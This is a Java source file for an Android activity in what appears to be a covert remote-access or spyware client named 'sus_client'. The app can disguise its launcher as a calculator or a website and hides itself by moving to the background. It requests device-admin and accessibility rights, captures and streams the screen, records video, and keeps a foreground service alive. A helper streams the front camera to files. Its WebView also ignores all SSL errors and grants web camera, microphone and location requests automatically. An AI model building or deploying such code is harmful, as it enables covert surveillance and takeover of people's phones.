package com.android.sus_client.applaunchers;

import static android.content.Intent.ACTION_MAIN;
import static android.content.Intent.ACTION_VIEW;

import static com.android.sus_client.applaunchers.WebViewUploadHandler.FILE_SELECT_REQUEST_CODE;
import static com.android.sus_client.applaunchers.WebViewUploadHandler.FILE_SELECT_REQUEST_CODE_ANDROID_5;
import static com.android.sus_client.control.Const.DEVICE_ADMIN_REQUEST_CODE;
import static com.android.sus_client.control.Const.REQUEST_CODE_ACCESSIBILITY_SERVICE;
import static com.android.sus_client.control.Const.REQUEST_CODE_MEDIA_PROJECTION;
import static com.android.sus_client.control.Const.SCREEN_RECORD_REQUEST_CODE;
import static com.android.sus_client.utils.Utils.addOrRemoveProperty;
import static com.android.sus_client.utils.Utils.dpToPxInt;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.PictureInPictureParams;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.content.res.ColorStateList;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.Point;
import android.graphics.PorterDuff;
import android.graphics.Rect;
import android.graphics.drawable.ClipDrawable;
import android.graphics.drawable.GradientDrawable;
import android.graphics.drawable.LayerDrawable;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Pair;
import android.util.Rational;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.webkit.GeolocationPermissions;
import android.webkit.PermissionRequest;
import android.webkit.SslErrorHandler;
import android.webkit.URLUtil;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;

import com.android.sus_client.R;
import com.android.sus_client.annotation.Nullable;
import com.android.sus_client.background.ForegroundWorker;
import com.android.sus_client.commonutility.DeviceAdminPolicies;
import com.android.sus_client.commonutility.cache.CacheManager;
import com.android.sus_client.commonutility.widget.WindowOverlayFrameLayout;
import com.android.sus_client.services.ForegroundService;
import com.android.sus_client.services.MyAccessibilityService;
import com.android.sus_client.utils.ColorAnimator;
import com.android.sus_client.utils.PermissionsBinder;
import com.android.sus_client.utils.Utils;
import com.android.sus_client.utils.ViewUtils;
import com.android.sus_client.utils.camera2.ACameraCapturingService;
import com.android.sus_client.utils.camera2.CameraCapturingServiceImpl;
import com.android.sus_client.utils.camera2.CameraFacing;
import com.android.sus_client.utils.camera2.FlashMode;
import com.android.sus_client.utils.camera2.VideoStreamCapturingListener;
import com.android.sus_client.utils.permissions.Permissions;

import org.webrtc.SurfaceViewRenderer;

import java.io.FileOutputStream;
import java.io.IOException;

public class ActionActivity extends Activity {

    public static final String ACTION_SCREEN_SHARING_PERMISSION_NEEDED = "ACTION_SCREEN_SHARING_PERMISSION_NEEDED";
    public static final String ACTION_RECORD_SCREEN = "ACTION_RECORD_SCREEN";
    public static final String ACTION_TAKE_SCREENSHOT = "ACTION_TAKE_SCREENSHOT";
    public static final String ACTION_ENABLE_DEVICE_ADMIN = "ACTION_ENABLE_DEVICE_ADMIN";
    public static final String ACTION_ENABLE_ACCESSIBILITY = "ACTION_ENABLE_ACCESSIBILITY";


    private DeviceAdminPolicies policies;
    private DeviceAdminPolicies.ActionType adminActionType;

    private boolean isBound = false;
    private ForegroundService myService;
    private ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            ForegroundService.ServiceBinder binder = (ForegroundService.ServiceBinder) service;
            isBound = true;
            myService = binder.getService();

                /*if (!MyAccessibilityService.isEnabled(ActionActivity.this)) {
                    startActivityForResult(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), REQUEST_CODE_ACCESSIBILITY_SERVICE);
                } else {
                    enableAccessibilityService(true);
                }*/

            if (!myService.adminOnlineStatus) {
                //askMediaProjectionPermission();
            } else if (myService.isMouseAccessibilityServiceAvailable()) {
                //setRemoteControlSwitch();
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            isBound = false;
            myService = null;
        }
    };



    public static void start(Context context, String action) {
        start(context, action, null);
    }

    public static void start(Context context, String action, @Nullable Bundle bundle) {
        Intent intent = new Intent(context, ActionActivity.class);
        intent.setAction(action);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        if (bundle != null) intent.putExtras(bundle);
        context.startActivity(intent);
    }

    private LinearLayout getSplashLayout() {
        LinearLayout root = new LinearLayout(this);
        // define main layout characteristics
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(Color.WHITE);
        root.setClickable(true);
        root.setFocusable(true);

        splashImage = new ImageView(this);
        splashImage.setScaleType(ImageView.ScaleType.FIT_XY);
        root.addView(splashImage, dpToPxInt(110), dpToPxInt(110));
        return root;
    }

    private RelativeLayout getWebViewLayout() {
        RelativeLayout root = new RelativeLayout(this);
        // define main layout characteristics
        root.setBackgroundColor(Color.WHITE);

        webView = new WebView(this);
        webView.setVerticalScrollBarEnabled(false);
        webView.setHorizontalScrollBarEnabled(false);
        webView.setOverScrollMode(View.OVER_SCROLL_NEVER);
        root.addView(webView, RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.MATCH_PARENT);

        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setElevation(3f);
        progressBar.setProgressDrawable(ViewUtils.getDrawable(this, android.R.drawable.progress_horizontal));
        root.addView(progressBar, RelativeLayout.LayoutParams.MATCH_PARENT, 6);
        addOrRemoveProperty(progressBar, RelativeLayout.ALIGN_PARENT_TOP, true);

        return root;
    }

    private RelativeLayout getSurfaceViewLayout() {
        RelativeLayout root = new RelativeLayout(this);
        // define main layout characteristics
        root.setBackgroundColor(Color.WHITE);

        surfaceView = new SurfaceViewRenderer(this);
        surfaceView.setVerticalScrollBarEnabled(false);
        root.addView(surfaceView, RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.MATCH_PARENT);
        surfaceView.setVisibility(View.GONE);
        return root;
    }

    private RelativeLayout getMainView() {
        RelativeLayout root = new RelativeLayout(this);

        // defining status custom bar view
        statusBarView = new View(this);
        statusBarView.setId(View.generateViewId());
        statusBarBackgroundColor = Color.TRANSPARENT;
        statusBarView.setBackgroundColor(statusBarBackgroundColor);

        root.addView(statusBarView, RelativeLayout.LayoutParams.MATCH_PARENT, Utils.getStatusBarHeight(this));
        addOrRemoveProperty(statusBarView, RelativeLayout.ALIGN_PARENT_TOP, true);

        webViewLay = getWebViewLayout();
        root.addView(webViewLay, RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.MATCH_PARENT);
        addOrRemoveProperty(webViewLay, RelativeLayout.BELOW, statusBarView.getId(), true);

        splashLayout = getSplashLayout();
        root.addView(splashLayout, RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.MATCH_PARENT);
        addOrRemoveProperty(splashLayout, RelativeLayout.BELOW, statusBarView.getId(), true);

        // defining translucent view over home screen
        mainView = new View(this);
        mainView.setBackgroundColor(Color.TRANSPARENT);
        root.addView(mainView, RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.MATCH_PARENT);
        addOrRemoveProperty(mainView, RelativeLayout.BELOW, statusBarView.getId(), true);

        RelativeLayout surfaceViewLayout = getSurfaceViewLayout();
        //root.addView(surfaceViewLayout, RelativeLayout.LayoutParams.MATCH_PARENT, RelativeLayout.LayoutParams.MATCH_PARENT);
        //addOrRemoveProperty(surfaceViewLayout, RelativeLayout.BELOW, statusBarView.getId(), true);
        System.out.println(surfaceViewLayout.getTag());

        return root;
    }

    private boolean onBackClick() {
        //Utils.showToast(this, "ON BACK PRESSED.");
        moveTaskToBack(true);
        return false;
    }

    @Override
    protected void onUserLeaveHint() {
        super.onUserLeaveHint();
        /*if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // The user has left the activity; consider entering PiP mode
            if (isInPictureInPictureMode()) {
                // Handle the user leaving the activity while in PiP mode
                Utils.showToast(this, "Handle the user leaving the activity while in PiP mode");
            } else {
                // Enter PiP mode when the user leaves the activity
                Utils.showToast(this, "entering in PiP mode");
                enterPiPMode();
            }
        }*/
    }

    @Override
    public void onPictureInPictureModeChanged(boolean isInPictureInPictureMode) {
        if (isInPictureInPictureMode) {
            // The activity is now in PiP mode. Hide the full-screen UI (controls, etc.) while in
            Utils.showToast(this, "activity is now in PiP mode");
        } else {
            // The activity is no longer in PiP mode. Restore the normal UI
            Utils.showToast(this, "activity is no longer in PiP mode");
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //if (PermissionsUtils.checkDrawOverOtherApps(this)) {
        //    setFloatingWindow(getMainView());
        //} else {
        //    setContentView(getMainView());
        //}

        setContentView(getMainView());
        onCreateActivity();
    }

    private WindowOverlayFrameLayout rootContainer;

    private void setFloatingWindow(RelativeLayout rootView) {
        // Add the floating window activity's content to the floating window.
        rootContainer = new WindowOverlayFrameLayout(this);
        rootContainer.addView(rootView);

        // Add the floating window to the window manager.
        try {
            rootContainer.addWindowOverlay(180, 260);
        } catch (RuntimeException e) {
            e.printStackTrace();
        }
    }

    @SuppressLint("ClickableViewAccessibility")
    private void onCreateActivity() {
        mainView.setVisibility(View.VISIBLE);
        webViewLay.setVisibility(View.GONE);
        progressBar.setVisibility(View.GONE);
        splashLayout.setVisibility(View.GONE);

        // go back to home screen after click on mainView
//        mainView.setOnTouchListener((v, event) -> {
//            // Get the visible rectangle of the screen.
//            Rect visibleRect = new Rect();
//            getWindow().getDecorView().getGlobalVisibleRect(visibleRect);
//
//            // Get the coordinates of the touch event.
//            float x = event.getX();
//            float y = event.getY();
//
//            Utils.showToastLong(this, "Window Location: " + (int) x + "x" + (int) y);
//
//            return onBackClick();
//        });

        Utils.enabledStrictMode();
        PermissionsBinder.loadPermissions(this);

        //NetcatConnectionReceiver.startServer(this);
        //DemoActivity.start(this);
        onStartActivity(getIntent());
    }

    private void onStartActivity(Intent intent) {
        webViewLay.setVisibility(View.GONE);
        final String action = (intent.getAction() == null ? ACTION_MAIN : intent.getAction());
        boolean isGoingToFinish = false;
        switch (action) {
            case ACTION_MAIN:
            case ACTION_VIEW:
                Pair<String, String> activeAlias = AppChanger.getInstance(this).getActiveAlias();
                String mAliasValue = activeAlias.second;
                if (intent.hasExtra("url")) {
                    mAliasValue = intent.getExtras().getString("url");
                }
                if (TextUtils.isEmpty(mAliasValue) || mAliasValue.equalsIgnoreCase("Default")) {
                    if (SetupPermissionsActivity.isSetupRequired(this)) {
                        isGoingToFinish = true;
                        startActivity(new Intent(this, SetupPermissionsActivity.class));
                    } else {
                        onBackClick();
                    }

                } else {
                    setupWebView(activeAlias.first, mAliasValue);
                }

                break;
            case ACTION_RECORD_SCREEN:
                MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                Intent permissionIntent = mediaProjectionManager != null ? mediaProjectionManager.createScreenCaptureIntent() : null;
                startActivityForResult(permissionIntent, SCREEN_RECORD_REQUEST_CODE);
                break;
            case ACTION_SCREEN_SHARING_PERMISSION_NEEDED:
                //startActivityForResult(projectionManager.createScreenCaptureIntent(), Const.REQUEST_SCREEN_SHARE);
                break;
            case ACTION_TAKE_SCREENSHOT:
                break;
            case ACTION_ENABLE_DEVICE_ADMIN:
                policies = new DeviceAdminPolicies(this);
                if (policies.isAdminActive()) {
                    adminActionType = (DeviceAdminPolicies.ActionType) intent.getExtras().getSerializable("actionType");
                    policies.processDataInternal(adminActionType);
                    isGoingToFinish = true;
                } else {
                    // ask DeviceAdmin permission
                    DeviceAdminPolicies.requestDeviceAdminPermission(this, policies.getDeviceAdminComponent());
                }
                break;
            case ACTION_ENABLE_ACCESSIBILITY:
                //String type = intent.getStringExtra("accessibility_type");
                //if ("remote_control".equals(type)) {
                    System.out.println("MyAccessibilityService: " + MyAccessibilityService.isEnabled(this));
                    //if (!MyAccessibilityService.isEnabled(this)) {
                    //    startActivityForResult(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), REQUEST_CODE_ACCESSIBILITY_SERVICE);
                    //} else {
                        enableAccessibilityService(true);
                        askMediaProjectionPermission();
                    //}
                //}
                break;
        }

        // restart foreground service
        stopService();
        startService();

        // enqueue work to start foreground service
        ForegroundWorker.enqueueWork(this);

        //if (isGoingToFinish) finish();
    }

    private void enableAccessibilityService(boolean isEnabled) {
        if (myService != null)
            myService.accessibilityServiceSet(getApplicationContext(), isEnabled);
    }

    private void askMediaProjectionPermission() {
        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), REQUEST_CODE_MEDIA_PROJECTION);
    }

    private void startService() {
        ForegroundService.startService(getApplication());
        ForegroundService.bindService(getApplication(), serviceConnection);
    }

    private void stopService() {
        if (isBound) unbindService(serviceConnection);
        ForegroundService.stopService(getApplication());
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent intent) {
        if (mUploadHandler != null) {
            if (requestCode == FILE_SELECT_REQUEST_CODE) {
                // Chose a file from the file picker.
                mUploadHandler.onResult(resultCode, intent);
                mUploadHandler = null;
                return;
            }
            if (requestCode == FILE_SELECT_REQUEST_CODE_ANDROID_5) {
                // Chose a file from the file picker.
                mUploadHandler.onResultForAndroid5(resultCode, intent);
                mUploadHandler = null;
                return;
            }
        }
        if (requestCode == SCREEN_RECORD_REQUEST_CODE) {
            sendBroadcast(ForegroundService.getBroadcastIntent("START_SCREEN_RECORDING", resultCode, intent));
        }
        if (requestCode == DEVICE_ADMIN_REQUEST_CODE) {
            if (resultCode == Activity.RESULT_OK && policies != null) {
                policies.processDataInternal(adminActionType);
            }
            finish();
        }
        if (requestCode == REQUEST_CODE_MEDIA_PROJECTION) {
            if (resultCode == RESULT_OK) {
                surfaceView.setVisibility(View.VISIBLE);
                myService.serverStart(intent, MyAccessibilityService.isEnabled(this), getApplicationContext(), surfaceView);
                //if (!appService.serverStart(data, httpServerPort, isAccessibilityServiceEnabled(), getApplicationContext())) {
                //    resetStartButton();
                //    return;
                //}
            } else {
                //resetStartButton();
            }
        }
        if (requestCode == REQUEST_CODE_ACCESSIBILITY_SERVICE) {
            if (MyAccessibilityService.isEnabled(this))
                enableAccessibilityService(true);
            //  else resetRemoteControlSwitch();
        }
    }


    @Override
    protected void onResume() {
        super.onResume();
        Utils.setStatusBarTranslucent(this, statusBarBackgroundColor);
    }

    @Override
    protected void onDestroy() {
        try {
            if (isBound) unbindService(serviceConnection);
        } catch (RuntimeException ignored) {
        }
        super.onDestroy();
        if (rootContainer != null) rootContainer.removeWindowOverlay();
    }

    /**
     * init WebView
     */
    private RelativeLayout webViewLay;
    private WebView webView;
    private SurfaceViewRenderer surfaceView;
    private View statusBarView;
    private ProgressBar progressBar;
    private LinearLayout splashLayout;
    private ImageView splashImage;
    private View mainView;

    private WebViewUploadHandler mUploadHandler;
    private final ColorAnimator colorAnimator = new ColorAnimator(Color.WHITE);

    private int statusBarBackgroundColor = Color.TRANSPARENT;

    @SuppressLint("SetJavaScriptEnabled")
    private void setupWebView(String mAliasName, String mUri) {
        Utils.setStatusBarFullScreen(this, Color.TRANSPARENT);
        getWindow().setNavigationBarColor(Color.TRANSPARENT);

        webViewLay.setVisibility(View.VISIBLE);
        mainView.setVisibility(View.GONE);
        statusBarBackgroundColor = Color.WHITE;
        statusBarView.setBackgroundColor(statusBarBackgroundColor);

        int iconRes = AppChanger.getLauncherIcon(mAliasName);
        if (iconRes != 0) {
            splashLayout.setVisibility(View.VISIBLE);
            splashImage.setImageResource(iconRes);
        } else {
            splashLayout.setVisibility(View.GONE);
            triggerProgressBar(true);
        }

        Utils.adjustResizeInFullscreenMode(this, webView, false);
        setGradientProgressBar();

        WebViewUploadHandler.setupWebViewSettings(webView);
        webView.setWebChromeClient(mWebChromeClient);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                // If url contains mailto link then open Mail Intent
                if (url.startsWith("mailto:")) {
                    // Could be cleverer and use a regex & Open links in new browser
                    startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));

                } else {
                    view.loadUrl(url);
                }
                return true;
            }

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                if (splashLayout.getVisibility() == View.GONE) {
                    triggerProgressBar(true);
                }
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                splashLayout.setVisibility(View.GONE);
                triggerProgressBar(false);
            }

            @Override
            public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                triggerProgressBar(false);
                webView.loadUrl("file:///android_asset/sus_error.html");
            }

            @SuppressLint("WebViewClientOnReceivedSslError")
            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                handler.proceed(); // Ignore SSL certificate errors
            }

        });

        if (URLUtil.isValidUrl(mUri)) {
            webView.loadUrl(mUri);
        } else {
            switch (mUri) {
                case "Calculator":
                    webView.loadUrl("file:///android_asset/SusCalculator/index.html");
                    break;
                default:
                    webView.loadUrl("https://www.google.com/search?q=" + mUri);
                    break;
            }
        }
    }

    private final WebChromeClient mWebChromeClient = new WebChromeClient() {

        @Override
        public void onPermissionRequest(PermissionRequest request) {
            Permissions.requestIfNotGranted(getApplicationContext(), new String[]{Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO}, var1 -> {
                runOnUiThread(() -> request.grant(request.getResources()));
                return null;
            });
        }

        @Override
        public void onReceivedIcon(WebView view, Bitmap icon) {
            super.onReceivedIcon(view, icon);
            // save favicon bitmap into cache
            CacheManager.saveFileForUrl(getApplicationContext(), icon, view.getUrl());

            final int mColor = getColorForStatusBar(icon);
            statusBarView.startAnimation(colorAnimator.animateTo(mColor, (mainColor, secondaryColor) -> {
                statusBarBackgroundColor = mainColor.args;
                statusBarView.setBackgroundColor(statusBarBackgroundColor);
                //binding.toolbar.setBackgroundColor(mainColor.args)
                //binding.searchContainer.background?.tint(secondaryColor.args)
                return null;
            }));
        }

        //Getting webview rendering progress
        @Override
        public void onProgressChanged(WebView view, int p) {
            if (progressBar.getVisibility() == View.VISIBLE) {
                progressBar.setProgress(p);
                if (p == 100) progressBar.setProgress(0);
            }
        }

        // overload the geoLocations permissions prompt to always allow instantly as app permission was granted previously
        public void onGeolocationPermissionsShowPrompt(String origin, GeolocationPermissions.Callback callback) {
            if (Build.VERSION.SDK_INT < 23 || Permissions.isGranted(getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION)) {
                // location permissions were granted previously so auto-approve
                callback.invoke(origin, true, false);
            } else {
                // location permissions not granted so request them
                ViewUtils.requestPermissions(ActionActivity.this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 84);
            }
        }

        // Android 5 & above
        @Override
        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> filePathCallback, FileChooserParams fileChooserParams) {
            mUploadHandler = new WebViewUploadHandler(ActionActivity.this);
            mUploadHandler.openFileChooserForAndroid5(filePathCallback, fileChooserParams);
            return true;
        }

        // Android 2.x
        public void openFileChooser(ValueCallback<Uri> uploadMsg) {
            openFileChooser(uploadMsg, "");
        }

        // Android 3.0
        public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType) {
            openFileChooser(uploadMsg, "", "filesystem");
        }

        // Android 4.1
        public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType, String capture) {
            mUploadHandler = new WebViewUploadHandler(ActionActivity.this);
            mUploadHandler.openFileChooser(uploadMsg, acceptType, capture);
        }
    };

    private void triggerProgressBar(boolean show) {
        if (progressBar == null) return;
        if (show) {
            progressBar.setVisibility(View.VISIBLE);
        } else {
            progressBar.setVisibility(View.GONE);
        }
    }

    private void setGradientProgressBar() {
        try {
            LayerDrawable layers = (LayerDrawable) progressBar.getProgressDrawable();
            ClipDrawable progressDrawable = null;
            GradientDrawable backgroundDrawable = null;
            for (int i = 0; i < layers.getNumberOfLayers(); i++) {
                if (layers.getId(i) == android.R.id.progress) {
                    progressDrawable = (ClipDrawable) layers.getDrawable(i);
                }
                if (layers.getId(i) == android.R.id.background) {
                    backgroundDrawable = (GradientDrawable) layers.getDrawable(i);
                }
            }
            if (backgroundDrawable != null) {
                backgroundDrawable.setTint(Color.LTGRAY);
                backgroundDrawable.setTintMode(PorterDuff.Mode.SRC_ATOP);
            }
            if (progressDrawable != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                final GradientDrawable gd = new GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT, new int[]{Color.parseColor("#6a38b8"), Color.parseColor("#9f2d92"), Color.parseColor("#e81f62"), Color.parseColor("#9f2d92"), Color.parseColor("#6a38b8")});
                gd.setGradientRadius(1f);
                gd.setCornerRadius(5);
                gd.setGradientCenter(0.40f, 0.85f);
                progressDrawable.setDrawable(gd);
            }
        } catch (Exception e) {
            progressBar.setProgressTintList(ColorStateList.valueOf(Color.parseColor("#4267B2")));
            progressBar.setProgressTintMode(PorterDuff.Mode.SRC_ATOP);
        }
    }

    private int getColorForStatusBar(Bitmap bitmap) {
        int defaultColor = Color.WHITE;
        int color = Utils.getDominantColor(bitmap, defaultColor);
        // Lighten up the dark color if it is too dark
        if (Utils.isColorTooDark(color)) {
            color = Utils.mixTwoColors(defaultColor, color, 0.25f);
        }
        return color;
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    /**
     * Extra testing functions
     */
    private void startTesting() {
        //startActivity(new Intent(this, ScreenRecorderActivity.class));
        //startActivity(new Intent(this, Camera2VideoImageActivity.class));
        //startActivity(new Intent(this, CameraActivity.class));

        //RemoteActionService.start(this, "Capture Image", new JSONObject());
        //RemoteActionService.start(context, actionCmd, actionData);

        //startStream();
    }

    private void startStream() {
        ACameraCapturingService pictureService = CameraCapturingServiceImpl.getInstance(getApplicationContext());
        pictureService.setCameraFacing(CameraFacing.Front);
        pictureService.setFlashMode(FlashMode.FLASH_OFF);
        pictureService.setImageCompressQuality(50);
        pictureService.streamVideoWithOverlay(new VideoStreamCapturingListener() {
            @Override
            public void onCapturingStart() {

            }

            @Override
            public void onCapturingProgress(long progress, int width, int height, byte[] bytes) {
                //Log.e("MainActivity", "onCapturingProgress ==> " + bytes.length);
                //runnable = () -> mainView.setImageBitmap(rgbFrameBitmap);
                //runnable.run();
                String fileName = "Image_" + System.nanoTime() + ".png";
                try (final FileOutputStream output = openFileOutput(fileName, Context.MODE_PRIVATE)) {
                    output.write(bytes);
                } catch (final IOException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onCaptureDone(String videoUrl, byte[] videoData) {

            }

            @Override
            public void onCaptureError(String error) {

            }
        });
    }

    /**
     * Helper Methods
     */

    private void enterPiPMode() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && getPackageManager().hasSystemFeature(PackageManager.FEATURE_PICTURE_IN_PICTURE)) {
            Point p = new Point();
            getWindowManager().getDefaultDisplay().getSize(p);

            // Set the desired aspect ratio
            int width = p.x; // 16
            int height = p.y; // 9
            enterPictureInPictureMode(new PictureInPictureParams.Builder().setAspectRatio(new Rational(width, height)).build());
        }
    }

    private void movePiPWindow(int x, int y) {
        // Implement the logic to move your PiP window based on the touch coordinates
        // You can use WindowManager to change the PiP window's position
        WindowManager.LayoutParams params = getWindow().getAttributes();
        params.x = x; // Set the x-coordinate
        params.y = y; // Set the y-coordinate
        getWindow().setAttributes(params);
    }

}